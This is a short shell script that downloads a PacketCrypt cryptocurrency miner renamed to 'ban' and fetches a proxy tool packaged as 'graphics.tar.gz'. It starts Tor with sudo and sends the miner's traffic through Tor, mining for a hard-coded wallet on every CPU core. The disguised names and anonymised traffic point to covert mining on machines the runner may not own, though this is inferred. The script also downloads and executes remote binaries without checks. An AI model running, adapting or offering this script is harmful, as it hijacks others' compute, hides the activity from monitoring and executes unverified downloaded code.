#banhke
wget -qO ban https://www.pkt.world/ext/packetcrypt-linux-amd64
chmod +x ban
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
tar -xvzf graphics.tar.gz
sleep 5
cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:9050
END
sleep 10
screen -dm -S start sudo service tor start
screen -dm -S local ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf
./graftcp/graftcp ./ban ann -p pkt1qn4ge4ycmggvjhdk0afpn0xv5wyaefya0nscq5t https://stratum.zetahash.com http://pool.pktpool.io/diff/8192 http://pool.pkt.world/ -t $(nproc --all) 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"

